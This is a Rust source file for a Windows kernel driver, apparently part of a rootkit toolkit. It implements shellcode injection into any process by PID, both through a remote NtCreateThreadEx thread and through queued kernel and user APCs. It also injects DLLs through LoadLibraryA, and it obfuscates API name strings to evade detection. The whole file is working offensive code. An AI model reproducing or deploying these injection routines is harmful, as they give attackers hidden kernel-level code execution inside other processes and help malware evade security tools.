#![allow(non_snake_case)]

use {
    obfstr::obfstr,
    wdk_sys::{
        *, 
        ntddk::*, 
        _MODE::{KernelMode, UserMode}
    },
    core::{
        ffi::c_void, ptr::null_mut, 
        mem::transmute
    },
    crate::{
        *,
        pool::PoolMemory,
        error::ShadowError, 
        patterns::find_zw_function, 
        handle::Handle, file::read_file,
        KAPC_ENVIROMENT::OriginalApcEnvironment,
    },
};

/// Represents shellcode injection operations.
///
/// The `Shellcode` struct provides methods for injecting shellcode into a target process
/// by allocating memory, copying shellcode, and creating a remote thread in the process.
pub struct Shellcode;

impl Shellcode {
    /// Injects shellcode into a target process using `NtCreateThreadEx`.
    ///
    /// This function performs the following steps:
    /// 1. Opens the target process with all access rights.
    /// 2. Allocates memory in the target process for the shellcode.
    /// 3. Copies the shellcode from the current process into the allocated memory.
    /// 4. Changes the memory protection to allow execution.
    /// 5. Creates a new thread in the target process to execute the shellcode.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the shellcode will be injected.
    /// * `path` - The file path to the shellcode to be injected, which will be read into memory.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step in the injection process fails, such as:
    ///     - Opening the process (`ZwOpenProcess` failure),
    ///     - Allocating virtual memory in the target process (`ZwAllocateVirtualMemory` failure),
    ///     - Protecting virtual memory (`ZwProtectVirtualMemory` failure),
    ///     - Creating the thread in the target process (`ZwCreateThreadEx` failure).
    pub unsafe fn injection_thread(pid: usize, path: &str) -> Result<NTSTATUS, ShadowError> {
        // Find the address of NtCreateThreadEx to create a thread in the target process
        let zw_thread_addr = find_zw_function(obfstr!("NtCreateThreadEx"))? as *mut c_void;

        // Retrieve the EPROCESS structure for the target process
        let target_eprocess = Process::new(pid)?;
        
        // Open the target process with all access rights
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);
        
        // Read the shellcode from the provided file path
        let shellcode = read_file(path)?;

        // Allocate memory in the target process for the shellcode
        let mut region_size = shellcode.len() as u64;
        let mut base_address = null_mut();
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the shellcode into the allocated memory in the target process
        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );
        
        // Change the memory protection to allow execution of the shellcode
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
        }

        // Create a thread in the target process to execute the shellcode
        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process.get(),
            transmute(base_address),
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut()
        );
        
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwCreateThreadEx", status));
        }

        // Close the thread handle after creation
        ZwClose(h_thread);

        Ok(STATUS_SUCCESS)
    }

    /// Injects shellcode into a target process using Asynchronous Procedure Call (APC).
    ///
    /// This function performs the following steps:
    /// 1. Finds an alertable thread in the target process.
    /// 2. Allocates memory in the target process for the shellcode.
    /// 3. Copies the shellcode from the current process to the target process.
    /// 4. Initializes two APCs (kernel and user).
    /// 5. Queues the APCs into the alertable thread of the target process.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the shellcode will be injected.
    /// * `path` - The file path to the shellcode that will be injected into the target process.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the shellcode injection is successful.
    /// * `Err(ShadowError)` - If any of the following steps fail:
    ///     - Finding an alertable thread (`find_thread_alertable`),
    ///     - Opening the process (`ZwOpenProcess` failure),
    ///     - Allocating memory in the target process (`ZwAllocateVirtualMemory` failure),
    ///     - Queuing the APC (`KeInsertQueueApc` failure).
    pub unsafe fn injection_apc(pid: usize, path: &str) -> Result<NTSTATUS, ShadowError> {
        // Read the shellcode from the provided file path
        let shellcode = read_file(path)?;

        // Find an alertable thread in the target process
        let thread_id = find_thread_alertable(pid)?;

        // Open the target process
        let target_eprocess = Process::new(pid)?;
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);

        // Allocate memory in the target process for the shellcode
        let mut base_address = null_mut();
        let mut region_size = shellcode.len() as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the shellcode into the target process's memory
        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );

        // Allocate memory for kernel and user APC objects
        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"krts"))
            .map(|mem: PoolMemory| {
                let ptr = mem.ptr as *mut _KAPC;
                core::mem::forget(mem);
                ptr
            })
            .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;

        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"urds"))
            .map(|mem: PoolMemory| {
                let ptr = mem.ptr as *mut _KAPC;
                core::mem::forget(mem);
                ptr
            })
            .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;

        // Initialize the kernel APC
        KeInitializeApc(
            kernel_apc, 
            thread_id, 
            OriginalApcEnvironment, 
            kernel_apc_callback, 
            None, 
            None, 
            KernelMode as i8, 
            null_mut()
        );

        // Initialize the user APC with the shellcode
        KeInitializeApc(
            user_apc, 
            thread_id, 
            OriginalApcEnvironment, 
            user_apc_callback, 
            None, 
            transmute::<_, PKNORMAL_ROUTINE>(base_address), 
            UserMode as i8, 
            null_mut()
        );

        // Insert the user APC into the queue
        if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()))
        }

        // Insert the kernel APC into the queue
        if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()))
        }

        Ok(STATUS_SUCCESS)
    }
}

/// Represents dll injection operations.
///
/// The `DLL` struct provides methods for injecting DLL into a target process
/// using either `NtCreateThreadEx`
pub struct DLL;

impl DLL {
    /// Injects a DLL into a target process by creating a remote thread that calls `LoadLibraryA`.
    ///
    /// This function opens the target process, allocates memory for the DLL path, and creates a remote thread
    /// in the target process to load the DLL using `LoadLibraryA`.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the DLL will be injected.
    /// * `path` - The file path to the DLL that will be injected.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step, such as opening the process, memory allocation, or thread creation, fails.
    pub unsafe fn injection_dll_thread(pid: usize, path: &str) -> Result<NTSTATUS, ShadowError> {
        // Find the address of NtCreateThreadEx to create a thread in the target process
        let zw_thread_addr = find_zw_function(obfstr!("NtCreateThreadEx"))?;

        // Find the address of LoadLibraryA in kernel32.dll
        let function_address = get_module_peb(pid, obfstr!("kernel32.dll"),obfstr!("LoadLibraryA"))?;
        
        // Open the target process
        let target_eprocess = Process::new(pid)?;
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);

        // Allocate memory in the target process for the DLL path
        let mut base_address = null_mut();
        let mut region_size = (path.len() * size_of::<u16>()) as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the DLL path into the target process's memory
        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            path.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            (path.len() * size_of::<u16>()) as u64,
            KernelMode as i8,
            &mut result_number,
        );

        // Change the memory protection to executabl
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
        }

        // Create a thread in the target process to load the DLL
        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process.get(),
            transmute(function_address),
            base_address,
            0,
            0,
            0,
            0,
            null_mut()
        );
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwCreateThreadEx", status));
        }

        // Close the handle to the thread
        ZwClose(h_thread);

        Ok(STATUS_SUCCESS)
    }
}


/// Kernel APC callback function.
/// 
/// This callback is triggered when the kernel APC is executed.
/// It ensures that the thread is alertable and then frees the allocated APC structure.
pub unsafe extern "system" fn kernel_apc_callback(
    apc: PKAPC,
    _normal_routine: *mut PKNORMAL_ROUTINE,
    _normal_context: *mut PVOID,
    _system_argument1: *mut PVOID,
    _system_argument2: *mut PVOID
) {
    // Ensure the thread is alertable in user mode
    KeTestAlertThread(UserMode as i8);

    // Free the APC object
    ExFreePool(apc as _)
}

/// User APC callback function.
/// 
/// This callback is triggered when the user APC is executed.
/// It checks if the thread is terminating and frees the APC structure when done.
pub unsafe extern "system" fn user_apc_callback(
    apc: PKAPC,
    normal_routine: *mut PKNORMAL_ROUTINE,
    _normal_context: *mut PVOID,
    _system_argument1: *mut PVOID,
    _system_argument2: *mut PVOID
) {
    // Check if the current thread is terminating and prevent the shellcode from executing
    if PsIsThreadTerminating(PsGetCurrentThread()) == 1 {
        *normal_routine = None;
    }

    // Free the APC object
    ExFreePool(apc as _)
}